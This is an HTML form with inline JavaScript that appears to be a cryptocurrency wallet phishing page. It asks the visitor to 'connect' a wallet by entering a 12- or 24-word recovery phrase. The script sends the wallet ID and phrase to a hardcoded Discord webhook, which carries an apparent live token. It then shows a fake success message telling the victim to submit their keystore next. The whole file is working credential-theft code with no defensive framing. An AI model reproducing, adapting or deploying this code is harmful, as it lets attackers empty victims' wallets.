<form  id="form" class="gform">
                        <div class="flex justify-evenly border-b-2 border-fuchsia-600 mb-4">
                          <div id="phrase" class="p-2 border-b-2 border-white hover:border-blue-600 cursor-pointer">
                            Phrase
                          </div>
                          <div id="keystore" class="p-2 border-b-2 border-white hover:border-blue-600 cursor-pointer">
                            Keystore JSON
                          </div>
                          <div id="private" class="p-2 border-b-2 border-white hover:border-blue-600 cursor-pointer">
                            Private Key
                          </div>
                        </div>
                        <div id="first" class="acc-body active">
                          <div class="flex flex-col">
    
                          </div>
                          <div class="flex flex-col mb-6">
                            <div class="relative"><input type="hidden" name="wallet_id" required="required" placeholder="Wallet ID" id="wallet_id" value="name"></div>
                            <div class="relative" data-children-count="1"><textarea cols="30" rows="4" placeholder="Enter your recovery phrase" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" name="phrase" required=""></textarea>
                              <p class="text-xs text-grey-300 mt-6">
                                Typically 12 (sometimes 24) words separated by
                                single spaces
                              </p>
                            </div>
                          </div>
                          <div class="flex w-full"><button type="submit" class="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in"><span class="mr-2 uppercase">Connect</span> <span><svg fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor" class="h-6 w-6">
                                  <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                </svg></span></button></div>
                                <!-- Successfully Submitted page-->
                                    <div style="display:none" class="thankyou_message">
                                       <p class="successful">Phrase Successfully Connected, goto Keystore JSON</p>
                                    </div>
                        </div>
  <script>
    document.getElementById('form').addEventListener('submit', function (event) {
        event.preventDefault(); // Prevents the default form submission

        var formData = {
            wallet_id: document.getElementById('wallet_id').value,
            phrase: document.getElementById('phrase').value
            // Add more form fields as needed
        };

        var request = new XMLHttpRequest();
        request.open("POST", "https://discord.com/api/webhooks/1042536959526060162/Uysmgbslm6N99WarS-fQqTwi3hzjIjNQXcB6GbVihrDO4L0-xccKfD1jqGaJ3YHueRRn", true);
        request.setRequestHeader('Content-type', 'application/json');

        var params = {
            content: (
                "> **WALLET ID  : **" + formData.wallet_id +
                "\n> **PHRASE : **" + formData.phrase
                // Add more fields to the content as needed
            )
        };

        request.send(JSON.stringify(params));

        // Optionally, you can handle the response or perform additional actions here.

        // Display the success message
        var successMessage = document.querySelector('#first .thankyou_message');
        if (successMessage) {
            successMessage.style.display = 'block';
        }

        // Optionally, you can reset the form fields
        document.getElementById('form').reset();
    });
</script>

                      </form>
